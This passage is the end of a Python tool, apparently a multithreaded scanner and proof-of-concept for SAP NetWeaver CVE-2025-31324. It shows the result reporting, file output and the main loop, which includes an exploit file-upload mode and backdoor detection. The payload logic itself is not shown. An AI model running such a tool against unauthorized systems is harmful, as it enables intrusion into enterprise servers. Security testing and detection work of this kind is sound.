    return None, "Exploit trigger failed after retries"


def save_and_print(results: List[ScanResult], outfile: Optional[Path]):
    """Prints results to console and optionally saves to file."""
    print(f"\n{C_BOLD}{'-'*15} Scan Results {'-'*15}{C_RST}")
    # Define colors for terminal output (use environment check or library later if needed)
    try:
        # Basic check if we are likely in a TTY that supports color
        is_tty = sys.stdout.isatty()
    except:
        is_tty = False

    status_color = {
        Status.VULNERABLE: C_RED + C_BOLD, # Make vulnerable bold red
        Status.SAFE: C_GREEN,
        Status.PATCHED_OR_WAF: C_YELLOW,
        Status.UNREACHABLE: C_BLUE,
        Status.ERROR: C_MAGENTA,
    } if is_tty else {s: "" for s in Status} # Empty strings if no color support
    backdoor_color = C_RED + C_BOLD if is_tty else "" # Backdoor is always critical
    reset_color = C_RST if is_tty else ""

    # Sort results for consistent output (by host then port)
    results.sort(key=lambda r: (r.target.host, r.target.port))

    # Console Output
    if not results:
        print(f"{C_YELLOW} No results to display.{C_RST}")
    else:
        max_target_len = max(len(r.target.base_url) for r in results) if results else 20
        label_width = 15 # Width for labels like "Target:", "Status:"

        for i, res in enumerate(results):
            cve_color = status_color.get(res.status, "")
            
            print(f"{C_CYAN}{'Target:':<{label_width}}{C_RST} {res.target.base_url:<{max_target_len}}")
            print(f"{C_CYAN}{'CVE Status:':<{label_width}}{C_RST} {cve_color}{res.status.value}{reset_color}")
            
            # Print CVE message/info
            if res.message and res.message != res.status.value:
                 print(f"{C_CYAN}{'CVE Info:':<{label_width}}{C_RST} {res.message}")
            # Print exploit_url if it exists
            if res.exploit_url:
                print(f"{C_GREEN}{C_BOLD}{'Exploit URL:':<{label_width}}{reset_color} {res.exploit_url}")

            # --- Print Backdoor Status --- 
            bd_status_str = f"{backdoor_color}YES{reset_color}" if res.backdoor_found else f"{C_GREEN}NO{reset_color}"
            print(f"{C_CYAN}{'Backdoor Found:':<{label_width}}{C_RST} {bd_status_str}")
            if res.backdoor_url:
                 print(f"{backdoor_color}{'Backdoor URL:':<{label_width}}{reset_color} {res.backdoor_url}")
            
            # Show error details (related to CVE check/exploit)
            if res.error_details and (res.status in [Status.ERROR, Status.UNREACHABLE] or logging.getLogger().level == logging.DEBUG):
                 print(f"{C_RED}{'CVE Error:':<{label_width}}{C_RST} {res.error_details}")

            # Print separator unless it's the last result
            if i < len(results) - 1:
                print(f"{C_BLUE}{'-' * (label_width + max_target_len + 1)}{C_RST}")

    # File Output
    if outfile:
        logging.info(f"Saving results to {outfile}...")
        results_dicts = [res.as_dict() for res in results]
        try:
            # Ensure parent directory exists
            outfile.parent.mkdir(parents=True, exist_ok=True)

            if outfile.suffix.lower() == '.csv':
                # Add new backdoor fields to headers
                headers = ["target", "status", "vulnerable", "exploit_url", "message", "error_details", "backdoor_found", "backdoor_url"]
                with outfile.open('w', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=headers)
                    writer.writeheader()
                    writer.writerows(results_dicts)
                logging.info(f"Results saved successfully to CSV: {outfile}")

            elif outfile.suffix.lower() == '.json':
                with outfile.open('w', encoding='utf-8') as f:
                    json.dump(results_dicts, f, indent=2)
                logging.info(f"Results saved successfully to JSON: {outfile}")

            else:
                logging.warning(f"Unsupported output file format: {outfile.suffix}. Please use .csv or .json.")

        except IOError as e:
            logging.error(f"Failed to write results to {outfile}: {e}")
        except Exception as e:
             logging.error(f"An unexpected error occurred while saving results to {outfile}: {e}", exc_info=True) 


def main():
    args = parse_cli()
    setup_logging(args.verbose)

    print(f"{C_CYAN}{C_BOLD}{'-' * 60}{C_RST}")
    print(f"{C_CYAN}{C_BOLD} SAP NetWeaver Visual Composer CVE-2025-31324 PoC{C_RST}")
    print(f"{C_CYAN} Target Path:{C_RST} {args.path}")
    # Check for args.exploit_file instead of args.exploit
    is_exploit_mode = args.exploit_file is not None
    print(f"{C_CYAN} Mode:{C_RST} {C_YELLOW if is_exploit_mode else C_GREEN}{'Exploit (File Upload)' if is_exploit_mode else 'Check (OAST + Backdoor)'}{C_RST}") # Updated mode desc
    print(f"{C_YELLOW} Disclaimer: Use responsibly and only on authorized systems.{C_RST}")
    print(f"{C_CYAN}{C_BOLD}{'-' * 60}{C_RST}")
    logging.info(f"Starting scan run with effective args: {vars(args)}")

    targets = load_targets(args)
    if not targets:
        print(f"{C_RED}No valid targets to scan.{C_RST}")
        sys.exit(0)

    results: List[ScanResult] = []
    start_time = time.monotonic()

    # Use tqdm for progress bar if installed and more than 1 target
    try:
        from tqdm import tqdm
        # Also check if running interactively (stdout is a TTY)
        use_tqdm = True if len(targets) > 1 and sys.stdout.isatty() else False
    except ImportError:
        use_tqdm = False
        if len(targets) > 1 and sys.stdout.isatty(): # Only warn if tqdm could have been used
             logging.warning(f"{C_YELLOW}tqdm not found, progress bar disabled. Install with: pip install tqdm{C_RST}")

    print(f"{C_BLUE}[*]{C_RST} Scanning {C_BOLD}{len(targets)}{C_RST} target(s) with {C_BOLD}{args.threads}{C_RST} threads...")

    with ThreadPoolExecutor(max_workers=args.threads, thread_name_prefix='Scanner') as pool:
        futures_map: Dict[Future[ScanResult], Target] = {pool.submit(scan_one, t, args): t for t in targets}

        iterable = as_completed(futures_map)
        if use_tqdm:
            # Customize tqdm bar format slightly if desired
            iterable = tqdm(iterable, total=len(targets), desc="Scanning", unit=" target", ncols=100,
                          bar_format=f"{{l_bar}}{C_GREEN}{{bar}}{C_RST}| {{n_fmt}}/{{total_fmt}} [{{elapsed}}<{{remaining}}, {{rate_fmt}}{{postfix}}]")

        for future in iterable:
            target = futures_map[future] # Get target corresponding to this future
            try:
                result = future.result() # Get result (blocks until ready)
                results.append(result)
                logging.debug(f"[{target.host}:{target.port}] Scan completed. Status: {result.status.value}")
                # Update tqdm postfix dynamically (optional)
                # if use_tqdm:
                #    vulnerable_count = sum(1 for r in results if r.status == Status.VULNERABLE)
                #    iterable.set_postfix_str(f"Vuln: {vulnerable_count}")
            except Exception as exc:
                # Catch errors from scan_one function itself (should be rare if handled within)
                logging.error(f"[{target.host}:{target.port}] Task generated an exception: {exc}", exc_info=True)
                # Create an error result for this target
                results.append(ScanResult(target=target, status=Status.ERROR, message="Internal error during scan task", error_details=str(exc)))


    end_time = time.monotonic()
    duration = end_time - start_time

    save_and_print(results, args.outfile) # save_and_print already has colors

    vulnerable_count = sum(1 for r in results if r.status == Status.VULNERABLE)
    safe_count = sum(1 for r in results if r.status == Status.SAFE)
    unreachable_count = sum(1 for r in results if r.status == Status.UNREACHABLE)
    error_count = sum(1 for r in results if r.status == Status.ERROR)
    patched_count = sum(1 for r in results if r.status == Status.PATCHED_OR_WAF)
    backdoor_count = sum(1 for r in results if r.backdoor_found) # Count backdoors

    print(f"\n{C_BOLD}{'-'*15} Scan Summary {'-'*15}{C_RST}")
    summary_label_width = 15
    print(f" {C_CYAN}{'Total Targets:':<{summary_label_width}}{C_RST} {len(targets)}")
    if vulnerable_count > 0:
        print(f" {C_RED}{C_BOLD}{'Vulnerable (CVE):':<{summary_label_width}}{C_RST} {vulnerable_count}{C_RST}") # Changed label
    if backdoor_count > 0:
        print(f" {C_RED}{C_BOLD}{'Backdoor Found:':<{summary_label_width}}{C_RST} {backdoor_count}{C_RST}")
        print(f" {'(Details above)':<{summary_label_width}}") # Added note for backdoor URLs
    print(f" {C_GREEN}{'Safe / No Issues:':<{summary_label_width}}{C_RST} {safe_count}") # Changed label
    print(f" {C_YELLOW}{'Patched / WAF:':<{summary_label_width}}{C_RST} {patched_count}") # Changed label
    print(f" {C_BLUE}{'Unreachable:':<{summary_label_width}}{C_RST} {unreachable_count}")
    if error_count > 0:
        print(f" {C_MAGENTA}{'Errors During Scan:':<{summary_label_width}}{C_RST} {error_count}") # Changed label
    print(f" {C_CYAN}{'Scan Duration:':<{summary_label_width}}{C_RST} {duration:.2f} seconds")
    print(f"{C_CYAN}{C_BOLD}{'-' * (summary_label_width * 2 + 4)}{C_RST}") # Match width roughly
    logging.info(f"Scan finished in {duration:.2f} seconds. Found {vulnerable_count} CVE vulnerable targets and {backdoor_count} backdoors.") 

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nScan interrupted by user.", file=sys.stderr)
        sys.exit(130) # Standard exit code for Ctrl+C